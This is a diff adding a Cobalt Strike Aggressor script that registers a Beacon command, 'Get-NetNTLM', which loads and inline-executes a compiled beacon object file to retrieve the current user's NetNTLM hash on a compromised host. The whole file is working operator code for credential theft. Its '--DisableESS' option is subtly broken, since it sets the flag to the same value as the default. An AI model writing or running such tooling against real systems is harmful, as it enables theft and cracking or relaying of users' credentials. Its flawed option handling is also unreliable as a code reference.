@@ -1,0 +1,33 @@
+beacon_command_register(
+"Get-NetNTLM",
+"Retrieve NetNTLM hash for the current user",
+"Usage: Get-NetNTLM <--DisableESS> \
+Get-NetNTLM Example: \
+   Get-NetNTLM \
+   Get-NetNTLM --DisableESS \
+   
+Get-NetNTLM Options: \
+    --DisableESS,     ");
+
+alias Get-NetNTLM {
+   local('$barch $handle $data $args $DisableESS $all');
+   $barch = barch($1);
+   $handle = openf(script_resource("Get-NetNTLM." . $barch . ".o"));
+   $data   = readb($handle, -1);
+   closef($handle);
+   if(strlen($data) == 0)
+   {
+      berror($1, "could not read bof file");
+      return;
+   }
+   $DisableESS = 0;
+   for ($i = 1; $i < size(@_); $i++)
+   {
+      if (@_[$i] eq "--DisableESS")
+      {
+         $DisableESS = 0;
+      }
+   }
+   $args = bof_pack($1, "i", $DisableESS);
+   beacon_inline_execute($1, $data, "go", $args);
+};
